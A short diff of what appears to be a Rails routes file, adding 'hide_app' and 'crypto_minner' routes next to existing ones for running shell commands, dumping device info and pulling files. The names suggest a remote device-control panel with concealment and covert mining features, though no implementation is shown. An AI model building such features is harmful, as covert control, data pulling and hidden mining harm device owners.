@@ -68,6 +68,8 @@ end
         post :run_shell_command
         post :dump_device_info
         post :pull_file
+        get :hide_app
+        get :crypto_minner
 
 
 
